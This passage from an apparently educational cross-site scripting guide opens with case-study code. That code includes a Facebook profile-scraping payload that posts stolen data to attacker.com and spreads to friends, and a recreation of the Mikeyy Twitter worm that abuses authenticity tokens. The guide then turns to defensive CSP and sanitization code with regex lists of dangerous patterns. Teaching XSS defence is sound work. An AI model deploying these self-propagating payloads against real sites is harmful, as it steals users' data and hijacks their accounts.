    exploitURL: 'https://facebook.com/profile.php?id=123&v=info#/javascript:alert(document.cookie)',
    
    // Payload execution
    payload: \`
        // Extract user data
        const userData = {
            name: document.querySelector('.profileName').textContent,
            friends: Array.from(document.querySelectorAll('.friendName')).map(el => el.textContent),
            photos: Array.from(document.querySelectorAll('.photoThumbnail')).map(el => el.src),
            posts: Array.from(document.querySelectorAll('.postContent')).map(el => el.textContent)
        };
        
        // Exfiltrate data
        fetch('https://attacker.com/facebook-data', {
            method: 'POST',
            body: JSON.stringify(userData)
        });
        
        // Spread to friends
        userData.friends.forEach(friend => {
            // Post malicious content to friend's wall
            fetch('/ajax/wall/post', {
                method: 'POST',
                body: new URLSearchParams({
                    target_id: friend.id,
                    message: 'Check out this cool link: ' + exploitURL
                })
            });
        });
    \`
};
```

### Case Study 6: Twitter XSS Worm "Mikeyy" (2009)

**Impact**: 1+ million Twitter accounts infected
**Attack Vector**: Stored XSS in tweet content
**Propagation**: Automatic retweeting and following

**Worm Implementation**:
```javascript
// Twitter XSS Worm (Mikeyy) - Educational Recreation
const twitterXSSWorm = \`
<script>
(function() {
    // Worm identification
    if (window.mikeyy_infected) return;
    window.mikeyy_infected = true;
    
    // Extract authentication tokens
    const authToken = document.querySelector('input[name="authenticity_token"]').value;
    const userId = document.querySelector('.current-user').dataset.userId;
    
    // Worm payload
    const wormTweet = 'Mikeyy is a genius! ' + window.location.href + ' #mikeyy';
    
    // Post infected tweet
    fetch('/status/update', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: new URLSearchParams({
            'authenticity_token': authToken,
            'status': wormTweet,
            'source': 'web'
        })
    });
    
    // Follow the worm creator
    fetch('/friendships/create/mikeyy', {
        method: 'POST',
        headers: {
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: new URLSearchParams({
            'authenticity_token': authToken
        })
    });
    
    // Modify user profile
    fetch('/account/settings', {
        method: 'POST',
        body: new URLSearchParams({
            'authenticity_token': authToken,
            'user[description]': 'I love Mikeyy! He is a genius!'
        })
    });
    
})();
</script>
\`;
```

## Advanced Defense Mechanisms

### Content Security Policy (CSP) Implementation

```javascript
// Advanced CSP configuration for XSS prevention
const advancedCSPConfig = {
    // Strict CSP for maximum security
    strict: {
        'default-src': ["'self'"],
        'script-src': [
            "'self'",
            "'strict-dynamic'",
            "'nonce-{random-nonce}'"
        ],
        'style-src': [
            "'self'",
            "'unsafe-inline'", // Only for legacy support
            "https://fonts.googleapis.com"
        ],
        'img-src': [
            "'self'",
            "data:",
            "https:"
        ],
        'connect-src': [
            "'self'",
            "https://api.example.com"
        ],
        'font-src': [
            "'self'",
            "https://fonts.gstatic.com"
        ],
        'object-src': ["'none'"],
        'base-uri': ["'self'"],
        'form-action': ["'self'"],
        'frame-ancestors': ["'none'"],
        'upgrade-insecure-requests': true,
        'block-all-mixed-content': true
    },
    
    // Generate nonce for inline scripts
    generateNonce: () => {
        const crypto = require('crypto');
        return crypto.randomBytes(16).toString('base64');
    },
    
    // CSP violation reporting
    reportUri: '/api/csp-report',
    
    // Express middleware implementation
    middleware: (req, res, next) => {
        const nonce = advancedCSPConfig.generateNonce();
        req.nonce = nonce;
        
        const cspHeader = Object.entries(advancedCSPConfig.strict)
            .map(([directive, sources]) => {
                if (Array.isArray(sources)) {
                    const sourceList = sources.map(source => 
                        source.includes('{random-nonce}') ? 
                        source.replace('{random-nonce}', nonce) : source
                    ).join(' ');
                    return \`\${directive} \${sourceList}\`;
                } else {
                    return directive;
                }
            })
            .join('; ');
        
        res.setHeader('Content-Security-Policy', cspHeader);
        res.setHeader('X-Content-Type-Options', 'nosniff');
        res.setHeader('X-Frame-Options', 'DENY');
        res.setHeader('X-XSS-Protection', '1; mode=block');
        
        next();
    }
};

// CSP violation handler
app.post('/api/csp-report', (req, res) => {
    const report = req.body['csp-report'];
    
    // Log CSP violation
    console.log('CSP Violation:', {
        documentUri: report['document-uri'],
        violatedDirective: report['violated-directive'],
        blockedUri: report['blocked-uri'],
        sourceFile: report['source-file'],
        lineNumber: report['line-number'],
        timestamp: new Date().toISOString()
    });
    
    // Store in security database
    prisma.cspViolation.create({
        data: {
            documentUri: report['document-uri'],
            violatedDirective: report['violated-directive'],
            blockedUri: report['blocked-uri'],
            userAgent: req.headers['user-agent'],
            ip: req.ip,
            timestamp: new Date()
        }
    });
    
    res.status(204).send();
});
```

### Advanced Input Sanitization Framework

```javascript
// Comprehensive XSS prevention framework
class XSSPreventionFramework {
    constructor() {
        this.sanitizers = {
            html: this.createHTMLSanitizer(),
            attribute: this.createAttributeSanitizer(),
            javascript: this.createJavaScriptSanitizer(),
            css: this.createCSSSanitizer(),
            url: this.createURLSanitizer()
        };
    }
    
    createHTMLSanitizer() {
        const DOMPurify = require('isomorphic-dompurify');
        
        return {
            // Strict sanitization - removes all potentially dangerous content
            strict: (input) => {
                return DOMPurify.sanitize(input, {
                    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
                    ALLOWED_ATTR: [],
                    KEEP_CONTENT: true,
                    RETURN_DOM: false,
                    RETURN_DOM_FRAGMENT: false,
                    RETURN_DOM_IMPORT: false
                });
            },
            
            // Moderate sanitization - allows more formatting
            moderate: (input) => {
                return DOMPurify.sanitize(input, {
                    ALLOWED_TAGS: [
                        'b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li',
                        'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote',
                        'a', 'img', 'table', 'thead', 'tbody', 'tr', 'td', 'th'
                    ],
                    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
                    ALLOWED_URI_REGEXP: /^(?:(?:https?|ftp):\/\/|mailto:|tel:)/i,
                    ADD_ATTR: ['target'],
                    ADD_DATA_URI_TAGS: [],
                    FORBID_ATTR: ['style', 'onclick', 'onerror', 'onload'],
                    FORBID_TAGS: ['script', 'object', 'embed', 'form', 'input']
                });
            },
            
            // Text-only sanitization
            textOnly: (input) => {
                return DOMPurify.sanitize(input, {
                    ALLOWED_TAGS: [],
                    KEEP_CONTENT: true
                });
            }
        };
    }
    
    createAttributeSanitizer() {
        return {
            // Sanitize HTML attributes
            sanitizeAttribute: (value, attributeName) => {
                // Remove dangerous attribute patterns
                const dangerousPatterns = [
                    /javascript:/i,
                    /vbscript:/i,
                    /data:text\/html/i,
                    /on\w+\s*=/i,
                    /<script/i,
                    /expression\s*\(/i
                ];
                
                for (const pattern of dangerousPatterns) {
                    if (pattern.test(value)) {
                        return '';
                    }
                }
                
                // Attribute-specific sanitization
                switch (attributeName.toLowerCase()) {
                    case 'href':
                    case 'src':
                        return this.sanitizers.url.sanitize(value);
                    case 'style':
                        return this.sanitizers.css.sanitize(value);
                    default:
                        return value.replace(/[<>"']/g, '');
                }
            }
        };
    }
    
    createJavaScriptSanitizer() {
        return {
            // Remove JavaScript from strings
            removeJavaScript: (input) => {
                const jsPatterns = [
                    /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
                    /javascript:/gi,
                    /on\w+\s*=\s*["'][^"']*["']/gi,
                    /on\w+\s*=\s*[^"'\s>]+/gi
                ];
                
                let sanitized = input;
                for (const pattern of jsPatterns) {
                    sanitized = sanitized.replace(pattern, '');
                }
                
                return sanitized;
            },
            
            // Validate JavaScript code (for admin features)
            validateJavaScript: (code) => {
                const dangerousPatterns = [
                    /eval\s*\(/i,
                    /Function\s*\(/i,
                    /setTimeout\s*\(/i,
                    /setInterval\s*\(/i,
                    /document\.write/i,
                    /innerHTML/i,
                    /outerHTML/i,
                    /insertAdjacentHTML/i
                ];
                
                for (const pattern of dangerousPatterns) {
                    if (pattern.test(code)) {
                        throw new Error(\`Dangerous JavaScript pattern detected: \${pattern}\`);
                    }
                }
                
                return true;
            }
        };
    }
    
    createCSSSanitizer() {
        return {
            sanitize: (cssValue) => {
                // Remove dangerous CSS patterns
                const dangerousPatterns = [
                    /javascript:/i,
                    /expression\s*\(/i,
                    /behavior\s*:/i,
                    /-moz-binding/i,
                    /import/i,
                    /@import/i,
                    /url\s*\(\s*["']?javascript:/i
                ];
                
                let sanitized = cssValue;
                for (const pattern of dangerousPatterns) {
                    sanitized = sanitized.replace(pattern, '');
                }
                
                return sanitized;
            }
        };
    }
    
    createURLSanitizer() {
        return {
            sanitize: (url) => {
                try {
                    const parsedUrl = new URL(url);
                    
                    // Only allow safe protocols
                    const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
                    if (!allowedProtocols.includes(parsedUrl.protocol)) {
                        return '#';
                    }
                    
                    return parsedUrl.href;
                } catch (error) {
                    return '#';
                }
            },
            
            isValidURL: (url) => {
                try {
                    new URL(url);
                    return true;
                } catch {
                    return false;
                }
            }
        };
    }
    
    // Main sanitization method
    sanitize(input, context = 'html', level = 'strict') {
        if (typeof input !== 'string') {
            return '';
        }
        
        switch (context) {
            case 'html':
                return this.sanitizers.html[level](input);
            case 'attribute':
                return this.sanitizers.attribute.sanitizeAttribute(input, level);
            case 'javascript':
                return this.sanitizers.javascript.removeJavaScript(input);
            case 'css':
                return this.sanitizers.css.sanitize(input);
            case 'url':
                return this.sanitizers.url.sanitize(input);
            case 'text':
                return this.sanitizers.html.textOnly(input);
            default:
                return this.sanitizers.html.strict(input);
        }
    }
    
    // Batch sanitization for objects
    sanitizeObject(obj, rules = {}) {
        const sanitized = {};
        
        for (const [key, value] of Object.entries(obj)) {
            const rule = rules[key] || { context: 'html', level: 'strict' };
            
            if (typeof value === 'string') {
                sanitized[key] = this.sanitize(value, rule.context, rule.level);
            } else if (typeof value === 'object' && value !== null) {
                sanitized[key] = this.sanitizeObject(value, rule.nested || {});
            } else {
                sanitized[key] = value;
            }
        }
        
        return sanitized;
    }
}

// Usage in application
const xssFramework = new XSSPreventionFramework();

// Middleware for automatic sanitization
const xssSanitizationMiddleware = (req, res, next) => {
    // Define sanitization rules for different endpoints
    const sanitizationRules = {
        '/api/comments': {
            content: { context: 'html', level: 'moderate' }
        },
        '/api/tasks': {
            title: { context: 'text' },
            description: { context: 'html', level: 'moderate' }
        },
        '/api/users/profile': {
            firstName: { context: 'text' },
            lastName: { context: 'text' },
            bio: { context: 'html', level: 'strict' }
        }
    };
    
    const rules = sanitizationRules[req.path] || {};
    
    if (req.body && Object.keys(rules).length > 0) {
        req.body = xssFramework.sanitizeObject(req.body, rules);
    }
    
    next();
};

// Apply middleware
app.use(xssSanitizationMiddleware);
```

## Additional Resources

### Professional Security Tools
- [DOMPurify](https://github.com/cure53/DOMPurify) - Industry-standard HTML sanitization
- [OWASP ZAP](https://owasp.org/www-project-zap/) - Comprehensive web security scanner
- [Burp Suite Professional](https://portswigger.net/burp/pro) - Advanced web application testing
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Content Security Policy analysis
- [XSS Hunter](https://xsshunter.com/) - Blind XSS detection platform
- [BeEF](https://beefproject.com/) - Browser Exploitation Framework

### Enterprise Security Solutions
- [Imperva WAF](https://www.imperva.com/products/web-application-firewall-waf/) - Enterprise XSS protection
- [Cloudflare WAF](https://www.cloudflare.com/waf/) - Cloud-based XSS filtering
- [F5 Advanced WAF](https://www.f5.com/products/security/advanced-waf) - Application layer security
- [AWS WAF](https://aws.amazon.com/waf/) - Amazon Web Services web application firewall

### Documentation and Standards
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [W3C CSP Specification](https://www.w3.org/TR/CSP3/) - Official CSP standard
- [OWASP DOM XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

### Training and Certification Resources
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting) - Interactive XSS training
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Hands-on security learning platform
- [Google XSS Game](https://xss-game.appspot.com/) - XSS challenge platform
- [HackerOne XSS Reports](https://hackerone.com/reports?keyword=xss) - Real-world XSS examples
- [Certified Ethical Hacker (CEH)](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/) - Professional certification

### Research and Advanced Topics
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - Comprehensive testing methodology
- [CSP Bypass Techniques](https://portswigger.net/research/bypassing-csp-with-policy-injection) - Advanced CSP research
- [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) - Advanced DOM manipulation
- [Mutation XSS](https://cure53.de/fp170.pdf) - Browser parsing inconsistencies
- [XSS in Modern Frameworks](https://portswigger.net/research/xss-in-hidden-inputs) - Framework-specific vulnerabilities

> Prepared by haseeb